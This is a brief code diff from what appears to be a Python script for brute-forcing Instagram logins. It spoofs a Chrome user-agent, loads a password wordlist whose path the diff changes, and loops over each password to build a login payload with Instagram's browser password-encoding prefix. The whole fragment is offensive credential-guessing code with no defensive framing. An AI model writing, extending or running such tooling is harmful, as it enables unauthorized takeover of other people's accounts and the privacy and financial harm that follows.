@@ -138,7 +138,7 @@ header = {
     "user-agent":ua.chrome
 }
 
-password = open("passwords.txt").read().splitlines()
+password = open("Wordlist/passwords.txt").read().splitlines()
 for password in password:
     data = {
         "enc_password":"#PWD_INSTAGRAM_BROWSER:0:0:"+password,
